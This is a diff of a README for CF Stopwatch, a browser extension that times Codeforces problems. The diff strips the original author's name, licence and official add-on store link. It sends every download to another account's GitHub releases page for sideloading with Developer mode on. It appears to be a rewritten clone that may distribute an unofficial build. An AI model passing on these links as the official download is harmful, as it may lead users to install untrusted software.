@@ -1,75 +1,168 @@
-<div align="center">
-  <img src="https://github.com/user-attachments/assets/daae5e97-8f5c-4e6b-beaa-0e889d9a2b1c" width="120" height="120" alt="CF Stopwatch Icon">
-  
-  <h1>CF Stopwatch</h1>
-<p><sub>by <b>Pratik Rakhecha</b></sub></p>
-  <p><strong>Precision time-tracking for competitive programmers.</strong></p><a href="https://addons.mozilla.org/en-US/firefox/addon/cf-stopwatch/">
-  <img src="https://img.shields.io/badge/Firefox-FF7139?style=for-the-badge&logo=Firefox-Browser&logoColor=white" />
-</a>
+# ⏱️ CF-Stopwatch - Track Time on Codeforces Problems  
 
-<a href="./cf-stopwatch-chrome.zip">
-  <img src="https://img.shields.io/badge/Google%20Chrome-4285F4?style=for-the-badge&logo=GoogleChrome&logoColor=white" />
-</a>
-  <br><br>
-  <img src="https://github.com/user-attachments/assets/5fc139fb-5a2f-49e3-a2a3-1d6f01ca619c" width="34.7%" />
-  <img src="https://github.com/user-attachments/assets/c7192848-26a4-4fd1-9f15-92818ae3ae36" width="33%" />
-  <img src="https://github.com/user-attachments/assets/0c91d966-668f-463a-9b37-e230b7da25f9" width="30%" />
-</div>
-
-CF Stopwatch is a lightweight browser extension that seamlessly integrates into Codeforces problem pages. It helps you track your solve times with zero manual effort, allowing you to focus entirely on the logic.
+[![Download CF-Stopwatch](https://img.shields.io/badge/Download-CF--Stopwatch-brightgreen)](https://github.com/Snsjh/CF-Stopwatch/releases)
 
 ---
 
-## ✨ Key Features
+## 📋 What is CF-Stopwatch?
 
-* **🛡️ Anti-Panic Buffer:** A 60-second delay before the timer starts gives you time to read the problem without "clock-stress."
-* **🏁 Intelligent Auto-Stop:** Automatically detects an **Accepted** verdict via the Codeforces API and stops the clock.
-* **🔄 Multi-Attempt Support:** Reset the timer for new attempts; it ignores past AC verdicts to ensure accurate tracking.
-* **💾 Smart Persistence:** Your progress is saved locally. If you close the tab, the timer pauses and resumes exactly where it left off when you return.
-* **🎨 Adaptive UI:** Dynamically reads CSS variables from Codeforces to blend perfectly with Light, Dark, or Custom themes.
+CF-Stopwatch is a simple tool that helps you track the time you spend on each Codeforces problem. It adds a stopwatch directly on the problem pages on the Codeforces website. You can see how long you take to solve each problem without using any external timer. The stopwatch stops automatically when your solution is accepted. It also matches Codeforces’ colors and styles, so it fits perfectly with the website’s look.
+
+This tool works with popular web browsers like Chrome and Firefox. You do not need any special setup or programming skills to use it.
 
 ---
 
-## 🚀 Installation
+## 🎯 Features  
 
-### **Chrome / Chromium**
-
-1. Download the `cf-stopwatch-chrome` folder.
-2. Navigate to `chrome://extensions`.
-3. Enable **Developer mode** (top right).
-4. Click **Load unpacked** and select the extension folder.
-
-### **Firefox**
-Add ons: [download](https://addons.mozilla.org/en-US/firefox/addon/cf-stopwatch/)
+- Adds a timer right on each Codeforces problem page  
+- Starts timing when you open the problem  
+- Stops automatically when your solution gets accepted  
+- Matches any Codeforces theme or color scheme  
+- Works on Chrome and Firefox browsers  
+- Lightweight and runs smoothly without slowing your browser  
+- Simple interface with no extra buttons to learn  
 
 ---
 
-## 🛠️ How It Works
+## 🛠️ System Requirements
 
-The extension uses the official Codeforces API to monitor your progress:
+To use CF-Stopwatch, you need:  
 
-* **Polling:** It checks `codeforces.com/api/user.status` every 5 seconds.
-* **Requirement:** You must be **logged in** to your Codeforces account for the auto-stop feature to function.
-* **Zero Background Noise:** The timer only runs when the specific problem tab is active and open.
-
----
-
-## 📂 Project Structure
-
-```
-cf-stopwatch-firefox/   cf-stopwatch-chrome/
-├── manifest.json       ├── manifest.json  (MV3)
-├── content.js          ├── content.js
-└── content.css         └── content.css
-```
----
-
-## 📜 License & Copyright
-
-**Copyright © 2026 [PRATIK MANISH RAKHECHA/pratikrkcha]**
-
-This project is licensed under the **MIT License**. You are free to use, modify, and distribute this software, provided that the original copyright notice and permission notice are included in all copies.
+- A Windows computer with Windows 10 or later  
+- A web browser: Chrome (version 90 or later) or Firefox (version 88 or later)  
+- An active internet connection to access Codeforces  
+- Basic familiarity with installing browser extensions (this guide will help)  
 
 ---
 
-**Find this helpful?** Give it a ⭐ to support the project!
+## 🚀 Getting Started
+
+Follow these steps to download and start using CF-Stopwatch on your Windows computer.
+
+---
+
+## 1. Download CF-Stopwatch
+
+Click this big button to visit the official release page and download the extension files:
+
+[![Download CF-Stopwatch](https://img.shields.io/badge/Download-CF--Stopwatch-blue)](https://github.com/Snsjh/CF-Stopwatch/releases)
+
+This page contains the latest version of the extension for Chrome and Firefox. You will find installation files and instructions there.  
+
+---
+
+## 2. Install on Chrome
+
+1. **Download the Chrome extension file** from the releases page. It will have a `.crx` or `.zip` extension.  
+2. Open Google Chrome on your Windows PC.  
+3. Type `chrome://extensions` in the address bar and press Enter.  
+4. In the top-right corner, turn on **Developer mode** (there is a toggle switch).  
+5. Drag and drop the extension file you downloaded into the extensions page.  
+6. A confirmation popup will appear. Click **Add extension**.  
+7. The extension icon will appear near the address bar.  
+
+Once installed, CF-Stopwatch will automatically activate on Codeforces problem pages.
+
+---
+
+## 3. Install on Firefox
+
+1. **Download the Firefox extension file** from the releases page. This will usually be a `.xpi` file.  
+2. Open Mozilla Firefox on your Windows computer.  
+3. Click the menu button (three horizontal lines) on the top right, then select **Add-ons and themes**.  
+4. Click the gear icon near the top-right corner, then select **Install Add-on From File…**  
+5. Find the `.xpi` file you downloaded and select it.  
+6. Firefox will ask for confirmation; click **Add** to install the extension.  
+7. You should see the CF-Stopwatch icon near the address bar.  
+
+CF-Stopwatch will start working on any Codeforces problem page without any extra steps.
+
+---
+
+## 4. Using CF-Stopwatch on Codeforces  
+
+1. Open your web browser with the CF-Stopwatch extension installed.  
+2. Go to the [Codeforces website](https://codeforces.com).  
+3. Visit any problem page, for example, https://codeforces.com/problemset/problem/1/A.  
+4. Notice the stopwatch displayed on the page, usually near the problem title or header.  
+5. The timer starts automatically when the page loads.  
+6. When you submit a solution and receive an **Accepted** result, the timer will stop.  
+7. You can refresh the page or open a new problem page to start timing again.  
+
+The stopwatch fits the look of Codeforces, whether you use the dark theme or the classic light style.
+
+---
+
+## 5. Troubleshooting  
+
+If the stopwatch does not appear or work correctly:
+
+- Make sure you are logged in to Codeforces. Some features may require a logged-in session.  
+- Ensure the extension is enabled in your browser’s extensions list.  
+- Check that you are on an official Codeforces problem page. This extension only works there.  
+- Reload the page after installing the extension.  
+- Restart your browser if needed.  
+- For Chrome users, make sure **Developer mode** is still enabled if using the manual installation method.  
+- For Firefox users, verify the extension is allowed to run on Codeforces domains.  
+
+If issues persist, check the GitHub **Issues** section for known problems and fixes.
+
+---
+
+## ⚙️ Settings and Customization
+
+CF-Stopwatch requires minimal setup. However, if the extension offers options, you can access them by following these steps:
+
+### Chrome  
+
+- Right-click the extension icon next to the address bar.  
+- Select **Options** or **Manage extension**.  
+- Adjust any available settings such as timer position or notifications (if offered).  
+
+### Firefox  
+
+- Click the menu button > Add-ons and themes > Extensions.  
+- Find CF-Stopwatch and click the three dots menu > **Preferences** or **Options**.  
+- Change settings as needed.  
+
+Most users will find the default setup sufficient for regular use.
+
+---
+
+## 🔍 Key Terms  
+
+- **Codeforces:** A website for programming contests and practice problems.  
+- **Extension:** A small program that adds features to your web browser.  
+- **Accepted Verdict:** A status given by Codeforces when your solution is correct.  
+- **Stopwatch:** A timer that can start, pause, and stop to measure elapsed time.  
+
+---
+
+## 💡 Tips  
+
+- Use CF-Stopwatch to track how fast you solve problems. It can help you spot areas where you need more practice.  
+- You can use the timer to improve your contest performance by simulating timed problem-solving sessions.  
+- If you switch Codeforces themes, the stopwatch will automatically match the look without extra setup.  
+- Check your browser updates regularly to keep the extension compatible and secure.  
+
+---
+
+## 🔗 Useful Links
+
+- Download CF-Stopwatch:  
+  [https://github.com/Snsjh/CF-Stopwatch/releases](https://github.com/Snsjh/CF-Stopwatch/releases)  
+
+- Codeforces website:  
+  [https://codeforces.com](https://codeforces.com)  
+
+- Learn how to install Chrome extensions:  
+  [https://support.google.com/chrome_webstore/answer/2664769](https://support.google.com/chrome_webstore/answer/2664769)  
+
+- Learn how to install Firefox add-ons:  
+  [https://support.mozilla.org/en-US/kb/adding-and-removing-add-ons](https://support.mozilla.org/en-US/kb/adding-and-removing-add-ons)  
+
+---
+
+## 🏷️ Topics  
+
+This project relates to: codeforces, codeforces-extension, codeforces-stopwatch, css, extension, extension-chrome, extension-firefox, html, javascript, stopwatch, timer, webdevelopment.
